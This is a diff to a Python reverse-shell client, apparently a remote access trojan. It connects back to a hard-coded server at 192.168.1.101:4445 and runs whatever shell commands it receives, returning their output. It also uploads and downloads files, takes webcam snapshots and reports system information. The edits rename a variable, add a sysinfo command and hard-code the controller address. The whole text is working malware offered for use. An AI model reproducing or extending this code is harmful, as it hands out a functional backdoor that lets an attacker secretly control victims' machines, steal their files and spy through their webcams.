@@ -55,44 +55,42 @@ def recv_file(path):
 def run():
     while True:
         # receive the command from the server
-        command = s.recv(BUFFER_SIZE).decode()
-        if command.lower() == "exit":
+        cmd = s.recv(BUFFER_SIZE).decode()
+        if cmd.lower() == "exit":
             # if the command is exit, just break out of the loop
             break
-        elif command[:2] == 'cd':
-            if command[3] == '~':
-                os.chdir(os.environ['HOME'] + (command[4:] if len(command) > 3 else None))
+        elif cmd[:2] == 'cd':
+            if cmd[3] == '~':
+                os.chdir(os.environ['HOME'] + (cmd[4:] if len(cmd) > 3 else None))
             else:
-                os.chdir(command[3:])
+                os.chdir(cmd[3:])
             s.send(os.getcwd().encode())
+        elif cmd[:7] == "sysinfo":
+            s.send(platform.platform().encode() + "\n".encode())
         # File download
-        elif command[:8] == "download":
-            filename = command[9:]
+        elif cmd[:8] == "download":
+            filename = cmd[9:]
             send_file(filename)
         # File upload
-        elif command[:6] == "upload":
-            filename = command[7:]
+        elif cmd[:6] == "upload":
+            filename = cmd[7:]
             recv_file(filename)
         # Webcam Snapshot
-        elif command[:11] == "webcam_snap":
+        elif cmd[:11] == "webcam_snap":
             webcam_snap()
         else:
-            # execute the command and retrieve the results
-            p = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
-            # send the results back to the server
+            p = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
             s.send(p.stdout + "\n".encode() + os.getcwd().encode())
     s.close()
 
 
 if __name__ == '__main__':
-    SERVER_HOST = "$HOST$"
-    SERVER_PORT = "$PORT$"
+    # SERVER_HOST = "$HOST$"
+    # SERVER_PORT = "$PORT$"
+    SERVER_HOST = "192.168.1.101"
+    SERVER_PORT = 4445
     BUFFER_SIZE = 10240
     s = socket.socket()
     s.connect((SERVER_HOST, SERVER_PORT))
-    # send platform message
-    s.send(platform.platform().encode() + "\n".encode() + os.getcwd().encode())
-    # acccept the chcp command
-    cmd = s.recv(BUFFER_SIZE).decode()
-    p = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
+    s.send(os.getcwd().encode())
     run()
